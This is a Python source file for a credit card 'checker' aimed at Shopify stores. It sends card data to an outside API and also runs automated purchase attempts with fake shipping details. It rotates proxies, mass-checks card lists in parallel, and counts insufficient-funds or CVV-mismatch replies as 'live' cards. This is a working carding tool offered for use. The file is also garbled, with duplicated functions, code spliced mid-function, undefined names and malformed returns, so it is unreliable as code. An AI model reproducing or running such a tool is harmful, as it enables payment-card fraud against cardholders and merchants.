import requests
import json
import traceback
import urllib3
import random
import re

# Disable SSL warnings (optional, if you make direct calls)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==========================================
# HELPER FUNCTIONS (kept for compatibility)
# ==========================================

def format_proxy(proxy):
    """Format proxy string to requests format (if needed elsewhere)."""
    try:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
    except:
        pass
    return None


# ==========================================
# MAIN CHECKER FUNCTION – USES EXTERNAL API
# ==========================================

def check_site_shopify_direct(site_url, cc, proxy=None):
    """
    Checks a credit card on a Shopify store by calling the external API:
    https://kamalxd.tech/sh/index.php

    Parameters:
        site_url (str): The Shopify store URL.
        cc (str): Card data in format "CC|MM|YYYY|CVV".
        proxy (str, optional): Proxy in format "host:port:user:pass".

    Returns:
        dict: A dictionary with keys 'Response', 'status', 'gateway', 'price', 'site'.
              This matches what your bot expects.
    """
    try:
        # Build API request parameters
        api_url = "https://kamalxd.tech/sh/index.php"
        params = {
            'cc': cc,
            'url': site_url
        }
        if proxy:
            params['proxy'] = proxy

        # Make the request (timeout 30 seconds)
        response = requests.get(api_url, params=params, timeout=30)
        data = response.json()

        # Extract fields from API response
        response_text = data.get('Response', 'Unknown')
        price = data.get('Price', '0.00')
        gateway = data.get('Gate', 'Unknown')
        site = data.get('Site', site_url)

        # Determine status based on response text
        status = 'ERROR'
        resp_lower = response_text.lower()
        if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower:
            status = 'APPROVED'
        elif 'declined' in resp_lower:
            status = 'DECLINED'
        elif 'insufficient' in resp_lower:
            status = 'APPROVED'          # treat insufficient funds as live
        elif 'cvv' in resp_lower:
            status = 'APPROVED'           # treat CVV mismatch as live
        elif 'do not honor' in resp_lower:
            status = 'DECLINED'
        else:
            # If nothing matches, keep as ERROR
            pass

        return {
            'Response': response_text,
            'status': status,
            'gateway': gateway,
            'price': price,
            'site': site
        }

    except requests.exceptions.Timeout:
        return {
            'Response': 'API timeout',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': site_url
        }
    except Exception as e:
        traceback.print_exc()
        return {
            'Response': f'API error: {str(e)}',
            'status': 'ERROR',
            'gateway': 'Unknown',
            'price': '0.00',
            'site': site_url
        }


# ==========================================
# RESPONSE PARSER (unchanged, used by app.py)
# ==========================================

def process_response_shopify(api_response, site_price='0'):
    """
    Processes the dictionary returned by check_site_shopify_direct
    and returns a tuple (message, status, gateway) as expected by app.py.
    """
    try:
        if not api_response or not isinstance(api_response, dict):
            return "System Error", "ERROR", "Unknown"

        status = api_response.get('status', 'ERROR').upper()
        message = api_response.get('Response', 'Unknown Result')
        gateway = api_response.get('gateway', 'Shopify Payments')

        # Map status to what app.py expects
        if status == 'APPROVED':
            # Check if OTP or 3DS is mentioned
            if 'otp' in message.lower() or 'authentication' in message.lower():
                status = 'APPROVED_OTP'
        elif status == 'DECLINED':
            pass  # keep as is
        else:
            status = 'ERROR'

        return message, status, gateway

    except Exception as e:
        return f"Parse Error: {e}", "ERROR", "Unknown"    # Afterpay detection
    if any(x in html_lower for x in ['afterpay.com', 'afterpay-checkout', 'clearpay']):
        return "Afterpay"
    
    # Razorpay detection
    if any(x in html_lower for x in ['razorpay.com', 'razorpay-checkout']):
        return "Razorpay"
    
    # Shopify Payments detection
    if any(x in html_lower for x in ['shopify_payments', 'shop_pay', 'shopifypayments']):
        return "Shopify Payments"
    
    # Default
    return "Normal"


def detect_gateway(site_url, session):
    """Detect payment gateway"""
    try:
        r = session.get(f"{site_url}/checkout", timeout=HTTP_TIMEOUT, verify=False)
        if 'shopify' in r.text.lower():
            return 'Shopify Payments'
        return 'Unknown'
    except:
        return 'Unknown'


def get_cheapest_product(site_url, session):
    """Get cheapest available product from site"""
    try:
        r = session.get(f"{site_url}/products.json?limit=250", timeout=HTTP_TIMEOUT, verify=False)
        if r.status_code != 200:
            return None, None
        
        data = r.json()
        products = data.get('products', [])
        
        cheapest_price = float('inf')
        cheapest_variant = None
        
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available'):
                    try:
                        price = float(variant.get('price', 0))
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            cheapest_variant = variant.get('id')
                    except:
                        continue
        
        return cheapest_variant, cheapest_price if cheapest_price != float('inf') else None
    except:
        return None, None


def create_checkout_session(site_url, variant_id, session):
    """Create real checkout session with product in cart"""
    try:
        cart_data = {
            'items': [{'id': variant_id, 'quantity': 1}]
        }
        
        r = session.post(
            f"{site_url}/cart/add.js",
            json=cart_data,
            headers={'Content-Type': 'application/json'},
            timeout=HTTP_TIMEOUT,
            verify=False
        )
        
        if r.status_code not in [200, 201]:
            return None
        
        r = session.get(f"{site_url}/cart", timeout=HTTP_TIMEOUT, verify=False)
        
        match = re.search(r'/checkouts/([a-zA-Z0-9]+)', r.text)
        if match:
            checkout_token = match.group(1)
            return f"{site_url}/checkouts/{checkout_token}"
        
        r = session.post(
            f"{site_url}/cart/add",
            data={'id': variant_id, 'quantity': 1},
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        if '/checkouts/' in r.url:
            return r.url
        
        return None
    except:
        return None


def submit_real_payment(checkout_url, cc, session):
    """Submit REAL payment and attempt purchase - NOT FAKE VALIDATION!"""
    try:
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return "DECLINED", "Invalid card format", "Unknown"
        
        card_number, exp_month, exp_year, cvv = cc_parts
        
        r = session.get(checkout_url, timeout=HTTP_TIMEOUT, verify=False)

        gateway_detected = detect_payment_gateway_advanced(r.text, checkout_url)
        
        if 'captcha' in r.text.lower() or 'recaptcha' in r.text.lower():
            return "ERROR", "Captcha detected", gateway_detected
        
        auth_token_match = re.search(r'name="authenticity_token".*?value="([^"]+)"', r.text)
        if not auth_token_match:
            return "ERROR", "No auth token", gateway_detected
        
        auth_token = auth_token_match.group(1)
        
        shipping_data = {
            'authenticity_token': auth_token,
            'checkout[email]': 'test@example.com',
            'checkout[shipping_address][first_name]': 'John',
            'checkout[shipping_address][last_name]': 'Doe',
            'checkout[shipping_address][address1]': '123 Test St',
            'checkout[shipping_address][city]': 'New York',
            'checkout[shipping_address][country]': 'United States',
            'checkout[shipping_address][province]': 'New York',
            'checkout[shipping_address][zip]': '10001',
            'checkout[shipping_address][phone]': '1234567890'
        }
        
        r = session.post(
            checkout_url,
            data=shipping_data,
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        payment_url = r.url
        r = session.get(payment_url, timeout=HTTP_TIMEOUT, verify=False)
        
        auth_token_match = re.search(r'name="authenticity_token".*?value="([^"]+)"', r.text)
        if auth_token_match:
            auth_token = auth_token_match.group(1)
        
        payment_data = {
            'authenticity_token': auth_token,
            'checkout[payment_gateway]': '',  # Shopify auto-detects
            'checkout[credit_card][number]': card_number,
            'checkout[credit_card][name]': 'John Doe',
            'checkout[credit_card][month]': exp_month,
            'checkout[credit_card][year]': exp_year,
            'checkout[credit_card][verification_value]': cvv
        }
        
        r = session.post(
            payment_url,
            data=payment_data,
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        response_text = r.text.lower()
        
        if any(x in response_text for x in [
            'thank you for your purchase',
            'order confirmed',
            'payment successful',
            'authentication required',
            'verify your payment',
            'insufficient funds',
            'card has insufficient funds',
            'not enough balance'
        ]):
            if 'insufficient funds' in response_text or 'not enough balance' in response_text:
                return "APPROVED", "Insufficient Funds", gateway_detected
            elif 'authentication' in response_text or 'verify' in response_text:
                return "APPROVED", "OTP Required", gateway_detected
            else:
                return "COOKED", "Purchase Successful", gateway_detected

        
        if any(x in response_text for x in [
            'card was declined',
            'declined',
            'invalid card',
            'card number is invalid',
            'expired card',
            'card has expired',
            'incorrect cvc',
            'security code is incorrect',
            'do not honor',
            'transaction not permitted'
        ]):
            if 'expired' in response_text:
                return "DECLINED", "Card Expired", gateway_detected
            elif 'cvc' in response_text or 'cvv' in response_text:
                return "DECLINED", "Incorrect CVV"
            else:
                return "DECLINED", "Card Declined", gateway_detected
        
        if 'captcha' in response_text or 'recaptcha' in response_text:
            return "ERROR", "Captcha Required", gateway_detected
        
        if 'too many requests' in response_text or 'rate limit' in response_text:
            return "ERROR", "Rate Limited", gateway_detected
        
        if 'processing' in response_text:
            return "APPROVED", "Payment Processing", gateway_detected
        
        return "ERROR", "Unknown Response", gateway_detected
        
    except requests.exceptions.Timeout:
        return "TIMEOUT", "Request timeout","Unknown"
    except Exception as e:
        return "ERROR", f"Payment error: {str(e)[:50]}","Unknown"


def check_card_real(cc, site_url, proxy=None, update_callback=None):
    """
    🚀 REAL CARD CHECKER - ACTUAL PURCHASE ATTEMPT!
    
    Flow:
    1. Find cheapest product
    2. Create checkout session
    3. Add shipping info
    4. Submit REAL payment
    5. Detect response (Approved/Cooked/Declined)
    """
    start_time = time.time()
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua()})
    
    if proxy:
        proxy_dict = format_proxy(proxy)
        if proxy_dict:
            session.proxies.update(proxy_dict)
    
    try:
        site_url = normalize_url(site_url)
        
        variant_id, price = get_cheapest_product(site_url, session)
        if not variant_id:
            return {
                'status': 'ERROR',
                'response': 'No products available',
                'gateway': 'Unknown',
                'price': '0.00',
                'time': time.time() - start_time,
                'proxy_used': proxy is not None
            }
        
        checkout_url = create_checkout_session(site_url, variant_id, session)
        if not checkout_url:
            return {
                'status': 'ERROR',
                'response': 'Checkout creation failed',
                'gateway': gateway,
                'price': f"{price:.2f}",
                'time': time.time() - start_time,
                'proxy_used': proxy is not None
            }
        
        status, response, gateway = submit_real_payment(checkout_url, cc, session)
        
        return {
            'status': status,
            'response': response,
            'gateway': gateway,
            'price': f"{price:.2f}",
            'time': time.time() - start_time,
            'proxy_used': proxy is not None
        }
        
    except Exception as e:
        return {
            'status': 'ERROR',
            'response': f'Check failed: {str(e)[:50]}',
            'gateway': 'Unknown',
            'price': '0.00',
            'time': time.time() - start_time,
            'proxy_used': proxy is not None
        }
    finally:
        session.close()


def format_proxy(proxy):
    """Format proxy string to requests format"""
    try:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
    except:
        pass
    return None



def mass_check_cards(cards, sites, proxies=None, max_workers=5, update_callback=None):
    """
    Mass check cards with REAL purchase attempts
    """
    results = []
    total = len(cards)
    completed = 0
    
    def check_single(cc):
        nonlocal completed
        site = random.choice(sites) if sites else None
        if not site:
            completed += 1
            return None
        
        site_url = site.get('url', site) if isinstance(site, dict) else site
        proxy = random.choice(proxies) if proxies else None
        
        result = check_card_real(cc, site_url, proxy, update_callback)
        result['cc'] = cc
        
        completed += 1
        if update_callback:
            update_callback(completed, total, result)
        
        return result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_cc = {executor.submit(check_single, cc): cc for cc in cards}
        
        for future in as_completed(future_to_cc):
            try:
                result = future.result()
                if result:
                    results.append(result)
            except Exception as e:
                print(f"Worker error: {e}")
                continue
    
    return results


def get_cheapest_product(site_url, session):
    """Get cheapest available product from site"""
    try:
        r = session.get(f"{site_url}/products.json?limit=250", timeout=HTTP_TIMEOUT, verify=False)
        if r.status_code != 200:
            return None, None
        
        data = r.json()
        products = data.get('products', [])
        
        cheapest_price = float('inf')
        cheapest_variant = None
        
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available'):
                    try:
                        price = float(variant.get('price', 0))
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            cheapest_variant = variant.get('id')
                    except:
                        continue
        
        return cheapest_variant, cheapest_price if cheapest_price != float('inf') else None
    except:
        return None, None


def create_checkout_session(site_url, variant_id, session):
    """Create real checkout session with product in cart"""
    try:
        cart_data = {
            'items': [{'id': variant_id, 'quantity': 1}]
        }
        
        r = session.post(
            f"{site_url}/cart/add.js",
            json=cart_data,
            headers={'Content-Type': 'application/json'},
            timeout=HTTP_TIMEOUT,
            verify=False
        )
        
        if r.status_code not in [200, 201]:
            return None
        
        r = session.get(f"{site_url}/cart", timeout=HTTP_TIMEOUT, verify=False)
        
        match = re.search(r'/checkouts/([a-zA-Z0-9]+)', r.text)
        if match:
            checkout_token = match.group(1)
            return f"{site_url}/checkouts/{checkout_token}"
        
        r = session.post(
            f"{site_url}/cart/add",
            data={'id': variant_id, 'quantity': 1},
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        if '/checkouts/' in r.url:
            return r.url
        
        return None
    except:
        return None


def submit_real_payment(checkout_url, cc, session):
    """Submit REAL payment and attempt purchase - NOT FAKE VALIDATION!"""
    try:
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return "DECLINED", "Invalid card format", "Unknown"
        
        card_number, exp_month, exp_year, cvv = cc_parts
        
        r = session.get(checkout_url, timeout=HTTP_TIMEOUT, verify=False)

        gateway_detected = detect_payment_gateway_advanced(r.text, checkout_url)
        
        if 'captcha' in r.text.lower() or 'recaptcha' in r.text.lower():
            return "ERROR", "Captcha detected", gateway_detected
        
        auth_token_match = re.search(r'name="authenticity_token".*?value="([^"]+)"', r.text)
        if not auth_token_match:
            return "ERROR", "No auth token", gateway_detected
        
        auth_token = auth_token_match.group(1)
        
        shipping_data = {
            'authenticity_token': auth_token,
            'checkout[email]': 'test@example.com',
            'checkout[shipping_address][first_name]': 'John',
            'checkout[shipping_address][last_name]': 'Doe',
            'checkout[shipping_address][address1]': '123 Test St',
            'checkout[shipping_address][city]': 'New York',
            'checkout[shipping_address][country]': 'United States',
            'checkout[shipping_address][province]': 'New York',
            'checkout[shipping_address][zip]': '10001',
            'checkout[shipping_address][phone]': '1234567890'
        }
        
        r = session.post(
            checkout_url,
            data=shipping_data,
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        payment_url = r.url
        r = session.get(payment_url, timeout=HTTP_TIMEOUT, verify=False)
        
        auth_token_match = re.search(r'name="authenticity_token".*?value="([^"]+)"', r.text)
        if auth_token_match:
            auth_token = auth_token_match.group(1)
        
        payment_data = {
            'authenticity_token': auth_token,
            'checkout[payment_gateway]': '',  # Shopify auto-detects
            'checkout[credit_card][number]': card_number,
            'checkout[credit_card][name]': 'John Doe',
            'checkout[credit_card][month]': exp_month,
            'checkout[credit_card][year]': exp_year,
            'checkout[credit_card][verification_value]': cvv
        }
        
        r = session.post(
            payment_url,
            data=payment_data,
            timeout=HTTP_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        response_text = r.text.lower()
        
        if any(x in response_text for x in [
            'thank you for your purchase',
            'order confirmed',
            'payment successful',
            'authentication required',
            'verify your payment',
            'insufficient funds',
            'card has insufficient funds',
            'not enough balance'
        ]):
            if 'insufficient funds' in response_text or 'not enough balance' in response_text:
                return "APPROVED", "Insufficient Funds", gateway_detected
            elif 'authentication' in response_text or 'verify' in response_text:
                return "APPROVED", "OTP Required", gateway_detected
            else:
                return "COOKED", "Purchase Successful", gateway_detected

        
        if any(x in response_text for x in [
            'card was declined',
            'declined',
            'invalid card',
            'card number is invalid',
            'expired card',
            'card has expired',
            'incorrect cvc',
            'security code is incorrect',
            'do not honor',
            'transaction not permitted'
        ]):
            if 'expired' in response_text:
                return "DECLINED", "Card Expired", gateway_detected
            elif 'cvc' in response_text or 'cvv' in response_text:
                return "DECLINED", "Incorrect CVV"
            else:
                return "DECLINED", "Card Declined", gateway_detected
        
        if 'captcha' in response_text or 'recaptcha' in response_text:
            return "ERROR", "Captcha Required", gateway_detected
        
        if 'too many requests' in response_text or 'rate limit' in response_text:
            return "ERROR", "Rate Limited", gateway_detected
        
        if 'processing' in response_text:
            return "APPROVED", "Payment Processing", gateway_detected
        
        return "ERROR", "Unknown Response", gateway_detected
        
    except requests.exceptions.Timeout:
        return "TIMEOUT", "Request timeout", "Unknown"
    except Exception as e:
        return "ERROR", f"Payment error: {str(e)[:50]}" "Unknown"


def check_card_real(cc, site_url, proxy=None, update_callback=None):
    """
    🚀 REAL CARD CHECKER - ACTUAL PURCHASE ATTEMPT!
    
    Flow:
    1. Find cheapest product
    2. Create checkout session
    3. Add shipping info
    4. Submit REAL payment
    5. Detect response (Approved/Cooked/Declined)
    """
    start_time = time.time()
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua()})
    
    if proxy:
        proxy_dict = format_proxy(proxy)
        if proxy_dict:
            session.proxies.update(proxy_dict)
    
    try:
        site_url = normalize_url(site_url)
        
        variant_id, price = get_cheapest_product(site_url, session)
        if not variant_id:
            return {
                'status': 'ERROR',
                'response': 'No products available',
                'gateway': 'Unknown',
                'price': '0.00',
                'time': time.time() - start_time,
                'proxy_used': proxy is not None
            }
        
        checkout_url = create_checkout_session(site_url, variant_id, session)
        if not checkout_url:
            return {
                'status': 'ERROR',
                'response': 'Checkout creation failed',
                'gateway': gateway,
                'price': f"{price:.2f}",
                'time': time.time() - start_time,
                'proxy_used': proxy is not None
            }
        
        status, response, gateway = submit_real_payment(checkout_url, cc, session)
        
        return {
            'status': status,
            'response': response,
            'gateway': gateway,
            'price': f"{price:.2f}",
            'time': time.time() - start_time,
            'proxy_used': proxy is not None
        }
        
    except Exception as e:
        return {
            'status': 'ERROR',
            'response': f'Check failed: {str(e)[:50]}',
            'gateway': 'Unknown',
            'price': '0.00',
            'time': time.time() - start_time,
            'proxy_used': proxy is not None
        }
    finally:
        session.close()


def format_proxy(proxy):
    """Format proxy string to requests format"""
    try:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
    except:
        pass
    return None



def mass_check_cards(cards, sites, proxies=None, max_workers=5, update_callback=None):
    """
    Mass check cards with REAL purchase attempts
    """
    results = []
    total = len(cards)
    completed = 0
    
    def check_single(cc):
        nonlocal completed
        site = random.choice(sites) if sites else None
        if not site:
            completed += 1
            return None
        
        site_url = site.get('url', site) if isinstance(site, dict) else site
        proxy = random.choice(proxies) if proxies else None
        
        result = check_card_real(cc, site_url, proxy, update_callback)
        result['cc'] = cc
        
        completed += 1
        if update_callback:
            update_callback(completed, total, result)
        
        return result
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_cc = {executor.submit(check_single, cc): cc for cc in cards}
        
        for future in as_completed(future_to_cc):
            try:
                result = future.result()
                if result:
                    results.append(result)
            except Exception as e:
                print(f"Worker error: {e}")
                continue
    
    return results

# ==========================================
# COMPATIBILITY FUNCTIONS (FIXED)
# ==========================================

def check_site_shopify_direct(site_url, cc_data, proxy=None):
    """
    Wrapper to make the Real Checker compatible with app.py
    """
    try:
        # Call the robust 'check_card_real' function defined above
        # This uses the full checkout flow (Cart -> Info -> Payment)
        result = check_card_real(cc_data, site_url, proxy)
        
        # app.py expects a dictionary with a key "Response" (Capital R)
        if result:
            result['Response'] = result.get('response', 'No Response')
            return result
        
        # Fallback if None
        return {
            'status': 'ERROR',
            'Response': 'Connection Error', 
            'response': 'Connection Error',
            'gateway': 'Unknown',
            'price': '0.00'
        }
            
    except Exception as e:
        traceback.print_exc()
        return {
            'status': 'ERROR', 
            'Response': str(e), 
            'response': str(e),
            'gateway': 'Unknown',
            'price': '0.00'
        }

def process_response_shopify(api_response, site_price='0'):
    """
    Process response to match app.py expectation:
    Returns tuple: (Message, Status, Gateway)
    """
    try:
        if not api_response or not isinstance(api_response, dict):
            return "System Error", "ERROR", "Unknown"

        # Extract details
        status = api_response.get('status', 'ERROR').upper()
        message = api_response.get('response', 'Unknown Result')
        gateway = api_response.get('gateway', 'Shopify Payments')
        
        # Ensure status matches what app.py expects
        if 'APPROVED' in status:
            if 'OTP' in message.upper() or 'AUTHENTICATION' in message.upper():
                status = 'APPROVED_OTP'
            else:
                status = 'APPROVED'
        elif 'DECLINED' in status:
            status = 'DECLINED'
        elif 'COOKED' in status:
            status = 'APPROVED' # Map COOKED to APPROVED for the bot to display it nicely
            
        return message, status, gateway

    except Exception as e:

        return f"Parse Error: {e}", "ERROR", "Unknown"
